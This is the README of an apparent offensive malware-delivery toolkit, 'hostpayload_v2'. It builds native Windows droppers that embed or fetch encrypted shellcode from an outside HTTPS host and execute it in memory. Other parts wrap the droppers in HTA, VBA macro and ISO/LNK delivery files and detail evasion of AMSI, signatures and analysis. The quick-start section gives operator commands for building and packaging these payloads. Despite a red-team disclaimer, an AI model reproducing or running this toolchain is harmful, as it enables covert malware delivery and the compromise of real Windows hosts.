# hostpayload_v2 — Modern Native Delivery Engine

A ground-up replacement for the PowerShell-heavy `hostpayload/` generator.
`hostpayload_v2` produces small native Windows droppers that either embed or
fetch encrypted shellcode over HTTPS, decrypt it with ChaCha20 + HMAC-SHA256,
and execute it from RW→RX memory without touching PowerShell or .NET.

> For authorized red-team / lab use only.

---

## Why this exists

The original `hostpayload` ("AdaptixPowerShell") is a 2020-era PowerShell
framework that modern defenses catch reliably:

- signatured `amsiInitFailed` reflection bypass
- RWX `VirtualAlloc` in every output path
- `Add-Type`, `GetDelegateForFunctionPointer`, `Marshal.Copy`, `WebClient`, `IEX`
- toy ciphers (XOR/RC4/ROT) with keys as plaintext hex arrays
- plaintext HTTP staging on port 80

`hostpayload_v2` removes all of those tells.

---

## Design principles

1. **No PowerShell for execution.** The final stage is a compiled native dropper.
2. **No RWX memory.** Allocate RW, copy the decrypted payload, then flip to RX.
3. **Real crypto.** ChaCha20 with a random 256-bit key and 96-bit nonce,
   authenticated with HMAC-SHA256 over the ciphertext.
4. **No signatured APIs in the dropper source.** APIs are resolved at runtime via
   a PEB walk + FNV1a hash (same technique as the NaX loader).
5. **Blended transport.** HTTPS fetch with a normal browser user-agent.
6. **Small output.** The staged dropper is a few KB of C, compiled with MinGW.

---

## Architecture

```
[ operator workstation ]
        |
        v
   pack.py --payload nax_adv.x64.bin --url https://cdn.example.com/s.bin
        |
        +--> encrypted payload blob (ChaCha20 + HMAC-SHA256)
        +--> dropper.c              (C template with embedded or staged blob)
        +--> dropper.exe            (MinGW cross-compile, optional)
        +--> delivery wrapper       (HTA, VBA macro, ISO/LNK)
        +--> self-decrypting shellcode (PIC, no EXE on disk)

[ target Windows host ]
        |
        v
   dropper.exe / macro / ISO / shellcode runs
   - anti-analysis check (quiet exit)
   - PEB walk resolves WinHttp*, kernel32, ntdll APIs by hash
   - (embed mode) copy encrypted payload from .rdata
   - (stage mode) HTTPS fetch of encrypted blob
   - verify HMAC-SHA256 over ciphertext
   - ChaCha20 decrypt in place
   - NtAllocateVirtualMemory RW -> copy -> NtProtectVirtualMemory RX
   - execute decrypted payload
```

---

## Project layout

```
hostpayload_v2/
  README.md                 this file
  pack.py                   operator CLI — encrypt payload + emit dropper
  src/
    dropper_template.c      self-contained C dropper template
  scripts/
    build.py                standalone MinGW compile helper
    build_all.py            full end-to-end regeneration + validation
    validate.py             static scan for signatures and bad patterns
    sc.py                   self-decrypting x64 PIC shellcode generator
  tests/
    test_crypto.py          ChaCha20 + HMAC roundtrip tests
    test_benign.py          benign 3-byte payload generator for VM tests
  delivery/
    hta.py                  HTA wrapper generator
    vba.py                  VBA macro dropper wrapper
    iso_lnk.py              ISO + LNK wrapper generator
  build/                    generated output (ignored by git)
```

---

## Build requirements

- Python 3.10+
- `pycryptodome`
- `x86_64-w64-mingw32-gcc` (MinGW-w64) for Windows cross-compilation

```bash
pip install pycryptodome
# macOS MinGW: brew install mingw-w64
```

---

## Quick start

```bash
cd /Users/hstn/c2dev/redteaming/hostpayload_v2

# Build a dropper that embeds the payload directly (no network fetch)
python3 pack.py --payload ../NaX/src_loader_adv/bin/nax_adv.x64.bin \
                --output dropper.exe

# Build a staged dropper that fetches the encrypted blob from HTTPS
python3 pack.py --payload ../NaX/src_loader_adv/bin/nax_adv.x64.bin \
                --url https://your-cdn.example.com/s.bin \
                --output dropper.exe

# Emit source only, and write the encrypted blob to dropper.bin for the server
python3 pack.py --payload ../NaX/src_loader_adv/bin/nax_adv.x64.bin \
                --url https://your-cdn.example.com/s.bin \
                --output dropper.c --blob

# Compile a previously generated source file
python3 scripts/build.py --output dropper.exe dropper.c

# Wrap a small staged dropper in an HTA file
python3 delivery/hta.py --dropper dropper.exe --output run.hta

# VBA macro that base64-decodes a tiny dropper and runs it
python3 delivery/vba.py --dropper dropper.c --output run.vba

# ISO + LNK tree (dropper + decoy README); burn with mkisofs
python3 delivery/iso_lnk.py --dropper dropper.c --output payload_tree
mkisofs -o payload.iso -J -R payload_tree

# Self-decrypting x64 PIC shellcode (no EXE on disk)
python3 tests/test_benign.py --output tests/benign.x64.bin
python3 scripts/sc.py --payload tests/benign.x64.bin --output sc.bin
python3 scripts/sc.py --payload tests/benign.x64.bin --output sc.py --format py
```

Use `--keep-source` to also keep the generated `dropper.c` next to the EXE.
Use `--ignore-cert` only in a lab; it disables TLS certificate validation.
Use `--blob` to write the server-side `nonce || ciphertext || hmac` blob for staged mode.

### Example output sizes

```text
dropper_embed.exe     109 056 bytes   (carries full encrypted nax_adv.x64.bin)
dropper_staged.exe      7 680 bytes   (fetches encrypted blob at runtime)
```

---

## Validation

Run the static scanner on any generated source or EXE:

```bash
python3 scripts/validate.py build/dropper.exe
python3 scripts/validate.py build/dropper.c
```

`--snapshot <dump>` scans a beacon process memory dump for identity material —
C2 URL / UA / header names in ASCII and UTF-16, raw AES key bytes, optional
RWX patterns. This is the W1.4 verification harness; clean = exit 0.

The scanner flags AMSI/ETW strings, PowerShell injection APIs, RWX allocation
patterns, plaintext HTTP URLs, and toy-cipher mentions. Legitimate bit-rotation
helpers (`ROL32`/`ROR32`) are not treated as Caesar-cipher signatures.

---

## OPSEC notes

- The dropper never calls `VirtualAlloc` directly; it uses
  `NtAllocateVirtualMemory` resolved via the PEB.
- No `LoadLibrary` strings appear in the binary; the PEB resolver uses hashed
  module/function names.
- HTTPS fetch uses `WinHttpOpen` with a rotated browser user-agent and no
  custom headers beyond the minimum.
- The encrypted blob layout is `nonce(12) || ciphertext || hmac(32)`. The
  256-bit key is XOR-obfuscated in the dropper; environmental keying is planned
  for a future iteration.
- Compiled with `-nostdlib`, `-fno-ident`, and `-Wl,--strip-all` so the EXE
  has no imports, no runtime, and no debug info.

---

## Testing & regression

### Quick sanity check

```bash
# Run crypto unit tests
python3 tests/test_crypto.py

# Build a benign 3-byte test payload, wrap it in the dropper, and verify it
# passes the static scanner
python3 tests/test_benign.py --output tests/benign.x64.bin
python3 pack.py --payload tests/benign.x64.bin --output tests/benign_dropper.exe
python3 scripts/validate.py tests/benign_dropper.exe
```

The benign dropper is ideal for safe VM testing: it executes a tiny shellcode
that returns 0 and ends the thread, with no network traffic.

### Full end-to-end regression

```bash
python3 scripts/build_all.py
```

This builds the NaX beacon, the advanced loader, packs `nax_adv.x64.bin`,
builds both hostpayload_v2 droppers, verifies the NaxHeader, and confirms the
embedded payload decrypts back to the original packed binary. It also runs the
static scanner on every generated artifact.

Use `--skip-beacon` / `--skip-loader` to avoid rebuilding when only the
packer/dropper changed.

---

## Capabilities and known gaps

Every delivery path ships today: native droppers (embed + fetch), HTA / VBA /
ISO-LNK wrappers, the self-decrypting shellcode variant, ChaCha20 + HMAC-SHA256
crypto with PBKDF-style key handling, and the build/validate pipeline
(`scripts/build_all.py`, `scripts/validate.py`) as merge gates.

Known gap: payload keys are per-build embedded constants. Target-specific /
environmental key derivation is designed but not implemented; treat the key
handling as build-time binding only.
